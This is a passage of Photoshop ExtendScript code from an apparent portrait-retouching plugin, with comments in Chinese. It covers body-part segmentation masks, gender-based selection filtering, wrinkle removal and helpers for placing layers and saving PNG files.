            if (selBounds) $._Kaibei.editSelect(-1);
            var desc1 = new ActionDescriptor();
            desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
            desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
            desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
            desc1.putBoolean(cTID('PrsT'), true);
            app.executeAction(sTID('fill'), desc1, DialogModes.NO);
            $._Kaibei.invSelection();
            $._Kaibei.delSelPixels();
            $._Kaibei.deSelection();
            var desc1 = new ActionDescriptor();
            desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
            desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
            desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
            app.executeAction(sTID('fill'), desc1, DialogModes.NO);
            $._Kaibei.setLayerOpacity(100);
            $._Kaibei.savePng(File(maskFile.parent + '/maskSkin.png'));
          }
          // if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(docSize.height, "px"), null, ResampleMethod.NEARESTNEIGHBOR);
          // else tempDoc.resizeImage(UnitValue(docSize.width, "px"), null, null, ResampleMethod.NEARESTNEIGHBOR);
          // $._Kaibei.copyLayerToDoc(doc);
          $._Kaibei.closeDoc();
        }
        // var timer = new Date();
        doc.suspendHistory('$XT_Thumbnail', '_getSkinMaskByPlug()');
        // alert(new Date()-timer);
        funName = funName || '|处理中';
        this.showProgress(funName.split("|")[1]);
        if (!File(maskFile.parent + '/mask' + Area + '.png').exists) {
          if (Area == 'Main') this.makeAllSelect();
          return !1;
        } else return this.autoSkin(Area, funName, !0);
      } else { //获取其它选区：衣服帽子、脖子、手、耳朵、四肢、头发、身体皮肤、脸部、人体
        this.showProgress('提取照片特征');
        this.deSelection();
        var maskFile = File(this.getAreaFile((typeof (Area) == 'object' && Area[0] == 'Human') ? 'Human' : 'Seg'));
        if (maskFile.exists) {
          var Seg = {
            Hair: 2, //头发
            Clothe: 3, //衣服
            Hat: 4, //帽子、领带、袜子、太阳镜、围巾
            Pants: 9, //裤子
            Body: 10, //身体皮肤
            Face: 13, //脸部
            Limb: 14, //四肢(不含手脚)
            Ear: 21, //耳朵
            Neck: 22, //脖子
            Hand: 23 //手和脚
          }
          var docSize = this.getDocSize();
          this.setDocResolution(72);
          var desc1 = new ActionDescriptor();
          desc1.putPath(cTID('null'), maskFile);
          desc1.putBoolean(cTID('Lnkd'), true);//false
          desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
          var desc2 = new ActionDescriptor();
          desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
          desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
          desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
          app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
          var areaLayer = doc.activeLayer;
          //对齐画布中心
          var mBounds = this.boundsToInt(this.getLayerBounds());
          var desc1 = new ActionDescriptor();
          var ref1 = new ActionReference();
          ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
          desc1.putReference(cTID('null'), ref1);
          var desc2 = new ActionDescriptor();
          desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), docSize.width / 2 - ((mBounds[2] - mBounds[0]) / 2 + mBounds[0]));
          desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), docSize.height / 2 - ((mBounds[3] - mBounds[1]) / 2 + mBounds[1]));
          desc1.putObject(cTID('T   '), cTID('Ofst'), desc2);
          app.executeAction(sTID('move'), desc1, DialogModes.NO);
          //取消偶尔出现的快速蒙板模式
          var desc1 = new ActionDescriptor();
          var ref1 = new ActionReference();
          ref1.putProperty(cTID('Prpr'), cTID('QucM'));
          ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Trgt'));
          desc1.putReference(cTID('null'), ref1);
          app.executeAction(sTID('clearEvent'), desc1, DialogModes.NO);
          mBounds = this.boundsToInt(this.getLayerBounds());
          if (typeof (Area) == 'object') {
            if (Area[0] == 'Human') { //人体
              for (var i = 1; i < Area.length; i++) {
                this.deSelection();
                this.setColorSelect([Area[i], Area[i], Area[i]]);
                if (!this.getSelectionBounds()) continue;
                this.invSelection();
                this.loadSelectionCrossLayer();
                this.makeRectSelect([mBounds[0], mBounds[1], mBounds[0] + 1, mBounds[1] + 1], 'Rctn', 'addTo');
                this.makeRectSelect([mBounds[2] - 1, mBounds[3] - 1, mBounds[2], mBounds[3]], 'Rctn', 'addTo');
                this.fullTransform(!0);
                this.invSelection();
                this.saveSelection('$XT|Temp|maskHuman' + (i - 1));
              }
            } else { //多部位选区
              for (var i = 0; i < Area.length; i++) {
                this.deSelection();
                this.setColorSelect([Seg[Area[i]], Seg[Area[i]], Seg[Area[i]]]);
                if (!this.getSelectionBounds()) continue;
                this.invSelection();
                this.loadSelectionCrossLayer();
                this.makeRectSelect([mBounds[0], mBounds[1], mBounds[0] + 1, mBounds[1] + 1], 'Rctn', 'addTo');
                this.makeRectSelect([mBounds[2] - 1, mBounds[3] - 1, mBounds[2], mBounds[3]], 'Rctn', 'addTo');
                this.fullTransform(!0);
                this.invSelection();
                this.deselectEdge();
                this.saveSelection('$XT|Temp|mask' + Area[i]);
              }
            }
          } else { //单部位选区
            this.deSelection();
            this.setColorSelect([Seg[Area], Seg[Area], Seg[Area]]);
            if (this.getSelectionBounds()) {
              this.invSelection();
              this.loadSelectionCrossLayer();
              this.makeRectSelect([mBounds[0], mBounds[1], mBounds[0] + 1, mBounds[1] + 1], 'Rctn', 'addTo');
              this.makeRectSelect([mBounds[2] - 1, mBounds[3] - 1, mBounds[2], mBounds[3]], 'Rctn', 'addTo');
              this.fullTransform(!0);
              this.invSelection();
              this.deselectEdge();
              this.saveSelection('$XT|Temp|mask' + Area);
            }
          }
          this.setDocResolution(docSize.resolution);
          this.deSelection();
          this.deleteLayer(areaLayer);
          if (typeof (Area) == 'string') this.loadSelection('$XT|Temp|mask' + Area);
          this.showProgress(funName.split("|")[1]);
        } else return !1;
      }
      return !0;
    } catch (e) {
      // alert(e+e.line);
      if (app.activeDocument.id != doc.id) this.closeDoc();
      return !1
    }
  },
  getGenderArea: function (areaList, gender, resolution, faceData, funName) { //获取指定性别的部位选区
    if (faceData.face) faceData = [faceData];
    this.autoSkin(areaList, funName);
    if (gender[0] != 'all') {
      var Human = ['Human'];
      for (var n = 0; n < faceData.length; n++) {
        if (faceData[n].faceScore < 0.4) continue;
        if (!this.contains(gender, faceData[n].gender)) Human.push(faceData[n].human_id)
      }
      if (Human.length > 1) {
        this.autoSkin(Human, funName);
        for (var n = 0; n < faceData.length; n++) {
          var humanIndex = this.findIndex(Human, faceData[n].human_id)
          if (humanIndex > 0) {
            this.loadSelectionAdd('$XT|Temp|maskHuman' + (humanIndex - 1))
            this.delSelection('$XT|Temp|maskHuman' + (humanIndex - 1))
          }
        }
        this.saveSelection('$XT|Temp|Human')
        //根据性别排除选区
        for (var n = 0; n < areaList.length; n++) {
          this.loadSelection('$XT|Temp|mask' + areaList[n])
          this.loadSelectionSubtract('$XT|Temp|Human')
          this.saveSelection('$XT|Temp|mask' + areaList[n])
        }
        this.deSelection()
      }
    }
  },
  removeWrinkle: function (_funName, gaussianBlur1, dustAndScratches, gaussianBlur2, addNoise, despeckle) { //祛除皱纹
    this.saveSelection(_funName + 'bozi');
    this.deSelection();
    app.executeAction(sTID('copyToLayer'), undefined, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 5);
    app.executeAction(sTID('highPass'), desc1, DialogModes.NO);
    app.executeAction(sTID('desaturate'), undefined, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Bl  '));
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putClass(cTID('Nw  '), cTID('Chnl'));
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), sTID("linearLight"));
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('Src2'), ref2);
    desc1.putObject(cTID('Usng'), cTID('Clcl'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), _funName + 'Alpha');
    desc1.putObject(cTID('T   '), cTID('Chnl'), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
    this.deleteLayer();
    this.duplicateLayer(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), gaussianBlur1 || 4);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    this.selectLayerByName(_funName);
    this.duplicateLayer(_funName + 'Temp2');
    this.moveTop();
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), _funName + 'Temp1');
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.setLayerMode('linearLight');
    this.loadSelection(_funName + 'Alpha');
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.editSelect(1);
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 8);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), 10);
    desc1.putInteger(cTID('Thsh'), 4);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 7);
    desc1.putInteger(cTID('Thsh'), 15);
    app.executeAction(sTID('surfaceBlur'), desc1, DialogModes.NO);
    this.layerSetWith(_funName + 'Temp2', _funName + 'Temp');
    this.loadSelection(_funName + 'bozi');
    this.makeMask(1);
    this.setMaskFeather(15.2);
    this.loadSelection(_funName + 'Alpha');
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.editSelect(1);
    this.selectLayerByName(_funName + 'Temp2');
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), dustAndScratches ? dustAndScratches[0] : 8);
    desc1.putInteger(cTID('Thsh'), dustAndScratches ? dustAndScratches[1] : 4);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    if (despeckle) {//去斑
      app.executeAction(sTID('despeckle'), undefined, DialogModes.NO);
    }
    this.deSelection();
    this.selectLayerByName(_funName + 'Temp');
    var desc1 = new ActionDescriptor();
    desc1.putBoolean(cTID('Dplc'), true);
    app.executeAction(sTID('mergeVisible'), desc1, DialogModes.NO);
    this.mergeWith(_funName + 'Temp1');
    this.duplicateLayer(_funName + 'Temp2');
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), gaussianBlur2 || 8);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    this.selectLayerByName(_funName + 'Temp2');
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), _funName + 'Temp1');
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.setLayerMode('linearLight');
    this.selectLayerByName(_funName + 'Temp1');
    this.loadSelection(_funName + 'bozi');
    this.setSelFeather(10);
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 25);
    desc1.putInteger(cTID('Thsh'), 15);
    app.executeAction(sTID('surfaceBlur'), desc1, DialogModes.NO);
    if (addNoise) {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Dstr'), cTID('Dstr'), cTID('Gsn '));
      desc1.putUnitDouble(cTID('Nose'), cTID('#Prc'), addNoise);
      desc1.putBoolean(cTID('Mnch'), false);
      desc1.putInteger(cTID('FlRs'), 69511079);
      app.executeAction(sTID('addNoise'), desc1, DialogModes.NO);
    }
    this.mergeWith(_funName + 'Temp2');
    this.makeMask(1);
  },
  removeWrinkle2: function (_funName, rat) { //祛除皱纹-7.0
    this.saveSelection('Aera');
    this.deSelection();
    //提取皱纹
    this.selectChannleByName('blue', !0)
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    desc1.putString(cTID('Nm  '), "copyBlue");
    app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    app.executeAction(sTID('invert'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putClass(cTID('Nw  '), cTID('Chnl'));
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), sTID("linearBurn"));
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('Src2'), ref2);
    desc1.putObject(cTID('Usng'), cTID('Clcl'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), "zw");
    desc1.putObject(cTID('T   '), cTID('Chnl'), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    this.selectChannleByName('RGB', !0)
    //处理皱纹
    this.duplicateLayer('shadowEven')
    this.duplicateLayer('keepDetails')
    this.selectLayerByName('shadowEven')
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), rat);//======
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    this.selectLayerByName('keepDetails')
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), "shadowEven");
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.setLayerMode('linearLight')
    this.layerSetWith('shadowEven', _funName)
    this.selectLayerByName('shadowEven')
    this.loadSelection('Aera')
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), rat * 10);//======
    desc1.putInteger(cTID('Thsh'), 6);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    app.executeAction(sTID('despeckle'), undefined, DialogModes.NO);

    return


    app.executeAction(sTID('copyToLayer'), undefined, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 5);
    app.executeAction(sTID('highPass'), desc1, DialogModes.NO);
    app.executeAction(sTID('desaturate'), undefined, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), cTID('Bl  '));
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putClass(cTID('Nw  '), cTID('Chnl'));
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), sTID("linearLight"));
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('Src2'), ref2);
    desc1.putObject(cTID('Usng'), cTID('Clcl'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), _funName + 'Alpha');
    desc1.putObject(cTID('T   '), cTID('Chnl'), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
    this.deleteLayer();
    this.duplicateLayer(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), gaussianBlur1 || 4);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    this.selectLayerByName(_funName);
    this.duplicateLayer(_funName + 'Temp2');
    this.moveTop();
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), _funName + 'Temp1');
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.setLayerMode('linearLight');
    this.loadSelection(_funName + 'Alpha');
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.editSelect(1);
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 8);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), 10);
    desc1.putInteger(cTID('Thsh'), 4);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 7);
    desc1.putInteger(cTID('Thsh'), 15);
    app.executeAction(sTID('surfaceBlur'), desc1, DialogModes.NO);
    this.layerSetWith(_funName + 'Temp2', _funName + 'Temp');
    this.loadSelection(_funName + 'bozi');
    this.makeMask(1);
    this.setMaskFeather(15.2);
    this.loadSelection(_funName + 'Alpha');
    app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
    this.loadSelectionCross(_funName + 'bozi');
    this.editSelect(1);
    this.selectLayerByName(_funName + 'Temp2');
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), dustAndScratches ? dustAndScratches[0] : 8);
    desc1.putInteger(cTID('Thsh'), dustAndScratches ? dustAndScratches[1] : 4);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    if (despeckle) {//去斑
      app.executeAction(sTID('despeckle'), undefined, DialogModes.NO);
    }
    this.deSelection();
    this.selectLayerByName(_funName + 'Temp');
    var desc1 = new ActionDescriptor();
    desc1.putBoolean(cTID('Dplc'), true);
    app.executeAction(sTID('mergeVisible'), desc1, DialogModes.NO);
    this.mergeWith(_funName + 'Temp1');
    this.duplicateLayer(_funName + 'Temp2');
    this.selectLayerByName(_funName + 'Temp1');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), gaussianBlur2 || 8);
    app.executeAction(sTID('gaussianBlur'), desc1, DialogModes.NO);
    this.selectLayerByName(_funName + 'Temp2');
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), _funName + 'Temp1');
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.setLayerMode('linearLight');
    this.selectLayerByName(_funName + 'Temp1');
    this.loadSelection(_funName + 'bozi');
    this.setSelFeather(10);
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), 25);
    desc1.putInteger(cTID('Thsh'), 15);
    app.executeAction(sTID('surfaceBlur'), desc1, DialogModes.NO);
    if (addNoise) {
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('Dstr'), cTID('Dstr'), cTID('Gsn '));
      desc1.putUnitDouble(cTID('Nose'), cTID('#Prc'), addNoise);
      desc1.putBoolean(cTID('Mnch'), false);
      desc1.putInteger(cTID('FlRs'), 69511079);
      app.executeAction(sTID('addNoise'), desc1, DialogModes.NO);
    }
    this.mergeWith(_funName + 'Temp2');
    this.makeMask(1);
  },
  getWrinkleArea: function (dust, median) { //提取皱纹选区
    this.deSelection();
    this.duplicateLayer("$XT|Temp|shadowEven");
    this.duplicateLayer("$XT|Temp|keepDetails");
    this.selectLayerByName("$XT|Temp|shadowEven");
    var desc1 = new ActionDescriptor();
    desc1.putInteger(cTID('Rds '), dust[0]);
    desc1.putInteger(cTID('Thsh'), dust[1]);
    app.executeAction(sTID('dustAndScratches'), desc1, DialogModes.NO);
    this.selectLayerByName("$XT|Temp|keepDetails");
    var desc1 = new ActionDescriptor();
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
    ref1.putName(cTID('Lyr '), "$XT|Temp|shadowEven");
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), cTID('Sbtr'));
    desc2.putDouble(cTID('Scl '), 2);
    desc2.putInteger(cTID('Ofst'), 128);
    desc1.putObject(cTID('With'), cTID('Clcl'), desc2);
    app.executeAction(sTID('applyImageEvent'), desc1, DialogModes.NO);
    this.mergeWith("$XT|Temp|shadowEven")
    app.executeAction(sTID('desaturate'), undefined, DialogModes.NO);
    this.selectChannleByName('red', !0)
    this.duplicateChannel('red2');
    app.executeAction(sTID('invert'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    desc1.putClass(cTID('Nw  '), cTID('Chnl'));
    var desc2 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('T   '), ref1);
    desc2.putEnumerated(cTID('Clcl'), cTID('Clcn'), sTID("hardMix"));
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc2.putReference(cTID('Src2'), ref2);
    desc1.putObject(cTID('Usng'), cTID('Clcl'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
    this.setChannelName('red3');
    var desc1 = new ActionDescriptor();
    desc1.putUnitDouble(cTID('Rds '), cTID('#Pxl'), median || 2);
    app.executeAction(sTID('median'), desc1, DialogModes.NO);
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Chnl'), sTID("selection"));
    desc1.putReference(cTID('null'), ref1);
    var ref2 = new ActionReference();
    ref2.putEnumerated(cTID('Chnl'), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('T   '), ref2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
    this.delSelection(['red2', 'red3']);
    this.selectChannleByName('RGB', !0)
    this.deleteLayer()
  },
  deselectEdge: function () { //减去边缘选区
    try {
      var docSize = this.getDocSize();
      var edge = Math.ceil(Math.max(docSize.width, docSize.height) / 1470);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putProperty(cTID('Chnl'), sTID("selection"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Top '), cTID('#Pxl'), edge);
      desc2.putUnitDouble(cTID('Left'), cTID('#Pxl'), edge);
      desc2.putUnitDouble(cTID('Btom'), cTID('#Pxl'), docSize.height - edge);
      desc2.putUnitDouble(cTID('Rght'), cTID('#Pxl'), docSize.width - edge);
      desc1.putObject(cTID('T   '), cTID('Rctn'), desc2);
      app.executeAction(sTID('interfaceWhite'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  placeEvent: function (iFile, isLink, offsetX, offsetY) { //置入图层
    try {
      if (typeof (iFile) != 'object') iFile = File(iFile);
      var desc1 = new ActionDescriptor();
      desc1.putPath(cTID('null'), iFile);
      desc1.putBoolean(cTID('Lnkd'), isLink == true);
      desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), offsetX || 0);
      desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), offsetY || 0);
      desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
      app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  savePng: function (pngFile) {
    try {
      if (typeof (pngFile) != 'object') pngFile = File(pngFile);
      if (!pngFile.parent.exists) pngFile.parent.create();
      var options = new ExportOptionsSaveForWeb();
      options.format = SaveDocumentType.PNG;
      app.activeDocument.exportDocument(pngFile, ExportType.SAVEFORWEB, options);
      return !0;
    } catch (e) { return !1 }
  },
  savePng24: function (pngFile, isCopy) {
    try {
      if (typeof (pngFile) != 'object') pngFile = File(pngFile);
      if (!pngFile.parent.exists) pngFile.parent.create();
      var pngSaveOptions = new PNGSaveOptions();
      app.activeDocument.saveAs(pngFile, pngSaveOptions, isCopy != !1, Extension.LOWERCASE);
      return pngFile.fsName;
    } catch (e) { return !1 }
  },
  copyLayerToDoc: function (doc, layerName) {//复制图层到文档
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putName(cTID('Dcmn'), doc.name);
      desc1.putReference(cTID('T   '), ref2);
      desc1.putInteger(sTID("destinationDocumentID"), doc.id);
      desc1.putString(cTID('Nm  '), layerName || "$XT_Thumbnail");
      app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  alignToSelection: function (ADSt) {//将图层与选区对齐
    try {
      if (!ADSt) {//居中对齐
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
        desc1.putReference(cTID('null'), ref1);
        desc1.putEnumerated(cTID('Usng'), cTID('ADSt'), sTID('ADSCentersH'));
        desc1.putBoolean(sTID("alignToCanvas"), false);
        app.executeAction(sTID('align'), desc1, DialogModes.NO);
